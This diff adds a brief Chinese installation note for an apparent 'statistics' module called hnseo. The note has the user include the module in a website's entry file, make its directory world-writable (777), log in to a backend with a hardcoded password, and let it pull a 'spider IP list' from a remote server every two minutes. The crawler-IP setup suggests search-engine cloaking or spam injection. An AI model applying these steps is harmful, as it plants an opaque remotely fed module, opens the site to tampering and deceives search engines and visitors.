@@ -1,0 +1,16 @@
+网站程序入口引用统计模块
+    if (file_exists(__DIR__ . '/hnseo/2.php')) {
+    include_once(__DIR__ . '/hnseo/2.php');
+    }
+
+tongji目录必须设置成777权限,子目录需要继承777权限
+
+访问tongji.php登录后台,登录密码 abingou2025
+
+IP列表自动更新功能:
+- 每2分钟自动从远程服务器获取最新蜘蛛IP列表
+- 远程URL: http://ip.3306.site/data/all.txt
+- 使用文件锁机制防止并发更新
+- 自动备份旧IP列表到ip.txt.bak
+- 自动设置文件权限为775
+- 更新日志记录在PHP错误日志中
